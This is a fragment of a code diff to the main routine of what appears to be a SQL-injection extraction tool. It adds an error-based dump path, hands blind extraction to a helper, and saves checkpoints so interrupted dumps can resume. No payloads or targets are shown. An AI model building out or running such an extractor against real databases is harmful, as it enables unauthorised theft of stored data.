+    print(f"\n[+] DBMS      : {det.dbms.name}")
+    print(f"[+] TECHNIQUE : {det.technique}")
+    print(f"[+] CONTEXT   : {det.ctx.name}" + (f"  signal={det.signal}" if det.signal else ""))
     print(f"[*] detection cost: {target.count} requests\n")
 
     print("=== PHASE 2: extraction ===")
-    sig = job_signature(a, oracle)
+    sig = job_signature(a, det, target)
     state_path = a.state or f".pgtb-{sig}.json"
-    print(f"[*] query  : {a.query}")
-    print(f"[*] state  : {state_path}")
+    print(f"[*] query : {a.query}")
 
+    if det.technique == "error-based":
+        val = extract_error(target, det.dbms, det.ctx, a)
+        if not val:
+            print("[!] error-based dump returned nothing; re-run with --no-error to fall back.")
+            sys.exit(1)
+        print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  (error-based, {det.dbms.name})")
+        return
+
+    print(f"[*] state : {state_path}")
     value, length = "", None
     if not a.fresh:
         st = load_state(state_path, sig)
         if st:
             length, value = st.get("length"), st.get("value", "")
-            print(f"[*] resuming from checkpoint: {len(value)}/{length} chars  ->  '{value}'")
-
-    if length is None:
-        length = oracle.length(a.query)
-        if length is None:
-            print("[!] length not found (empty result, bad query, or maxlen too low)")
-            sys.exit(1)
-        save_state(state_path, sig, length, value, target.count)
-    print(f"[+] length = {length}\n[*] extracting: {value}", end="", flush=True)
-
-    try:
-        for pos in range(len(value) + 1, length + 1):
-            value += oracle.char(a.query, pos)
-            save_state(state_path, sig, length, value, target.count)
-            sys.stdout.write(value[-1]); sys.stdout.flush()
-    except KeyboardInterrupt:
-        save_state(state_path, sig, length, value, target.count)
-        print(f"\n\n[!] interrupted - progress saved to {state_path}")
-        print("    re-run the SAME command to resume from here.")
-        sys.exit(130)
-
-    print(f"\n\n[+] RESULT: {value}")
-    print(f"[*] total requests: {target.count}  (type: {oracle.kind})")
+            print(f"[*] resuming: {len(value)}/{length} -> '{value}'")
+    val = extract_search(det.oracle, a, state_path, sig, value, length)
+    if val is None:
+        print("[!] length not found (empty result, bad query, or maxlen too low)")
+        sys.exit(1)
+    print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
     try:
         os.remove(state_path)
     except OSError:
